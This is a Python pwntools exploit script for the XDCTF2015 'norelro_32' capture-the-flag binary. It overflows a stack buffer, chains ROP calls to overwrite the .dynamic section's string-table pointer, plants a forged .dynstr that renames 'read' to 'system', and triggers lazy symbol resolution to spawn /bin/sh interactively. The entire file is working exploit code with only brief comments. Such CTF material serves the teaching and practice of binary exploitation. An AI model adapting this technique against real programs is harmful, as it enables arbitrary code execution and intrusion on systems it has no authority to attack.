from pwn import *
context(arch='i386',log_level='debug')
elf = ELF('norelro_32')
io = process(elf.path)
rop = ROP('norelro_32')

#gdb.attach(io,"b * 0x080484fe")
payload = flat(['a'*0x6c+'bbbb'])
rop.raw(payload)
# modify .dynstr pointer in .dynamic section to a specific location
DT_STRTAB_addr = 0x08049794 + 4
rop.read(0,DT_STRTAB_addr,4) # read - 1 
# construct a fake dynstr section
dynstr_data = elf.get_section_by_name('.dynstr').data()
fake_dynstr_data = dynstr_data.replace(b"read",b"system")
print('dynstr',fake_dynstr_data)
print('dynstr len',len(fake_dynstr_data))
blank_addr = 0x8049890
blank2_addr = 0x8049890+0x100 
bin_sh_str = "/bin/sh\x00" 
rop.read(0,blank_addr,len((fake_dynstr_data))) # read - 2
rop.read(0,blank2_addr,len(bin_sh_str)) # read - 3
read_plt_push_jmp_addr = 0x08048386
rop.raw(read_plt_push_jmp_addr) #push 8;jmp  sub_8048360;
rop.raw('bbbb')
rop.raw(blank2_addr) #/bin/sh
print(rop.dump())

io.recvuntil('Welcome to XDCTF2015~!')
io.send(rop.chain())
io.recv()
io.send(p32(blank_addr))
io.send(fake_dynstr_data)
io.send(bin_sh_str)
io.interactive()
